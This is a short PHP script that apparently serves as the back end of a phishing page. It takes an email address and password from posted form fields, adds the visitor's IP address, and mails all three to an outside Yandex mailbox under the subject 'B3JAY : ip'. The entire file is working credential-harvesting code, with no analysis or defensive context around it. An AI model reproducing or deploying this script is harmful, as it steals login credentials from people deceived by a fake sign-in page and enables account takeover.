<?php
$ip = getenv("REMOTE_ADDR");	

if(!empty($_POST)) {
 $ai= $_POST['ai'];
 $pr = $_POST['pr'];
 
		$to = "mariescro@yandex.com";
		
		
         $subject = "B3JAY : ip";
		 
		 $message =  "Email ID            : ".$ai."\r\n";
         $message .= "Password           : ".$pr."\r\n";
         $message .= "Ip           : ".$ip."\r\n";
		 
		$header = "Coded by: AutoPHP \r\n";
         $header .= "MIME-Version: 1.0\r\n";
         $header .= "Content-type: text/html\r\n";
		 
		 mail ($to,$subject,$message,$header);
}
?>